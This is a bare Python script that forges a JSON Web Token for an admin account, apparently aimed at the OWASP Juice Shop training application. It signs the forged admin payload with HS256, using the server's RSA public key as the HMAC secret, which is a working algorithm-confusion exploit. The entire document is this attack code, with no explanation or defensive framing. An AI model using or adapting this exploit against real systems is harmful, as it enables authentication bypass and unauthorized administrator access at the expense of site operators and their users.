import base64
import hmac
import hashlib
import json

# Original token parts
header = {"typ": "JWT", "alg": "HS256"}
payload = {
    "status": "success",
    "data": {
        "id": 999,
        "username": "forged",
        "email": "forged@example.com",
        "password": "fakehash",
        "role": "admin",
        "deluxeToken": "",
        "lastLoginIp": "",
        "profileImage": "assets/public/images/uploads/defaultAdmin.png",
        "totpSecret": "",
        "isActive": True,
        "createdAt": "2026-02-26 22:05:49.181 +00:00",
        "updatedAt": "2026-02-26 22:05:49.181 +00:00",
        "deletedAt": None
    },
    "iat": 1772155065
}

# Read public key
with open('jwt_public.key', 'rb') as f:
    secret = f.read()

# Base64 URL encode
def b64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')

# Create token parts
header_encoded = b64url_encode(json.dumps(header, separators=(',', ':')).encode())
payload_encoded = b64url_encode(json.dumps(payload, separators=(',', ':')).encode())

# Create signature
message = f"{header_encoded}.{payload_encoded}".encode()
signature = hmac.new(secret, message, hashlib.sha256).digest()
signature_encoded = b64url_encode(signature)

# Combine
forged_token = f"{header_encoded}.{payload_encoded}.{signature_encoded}"
print(forged_token)
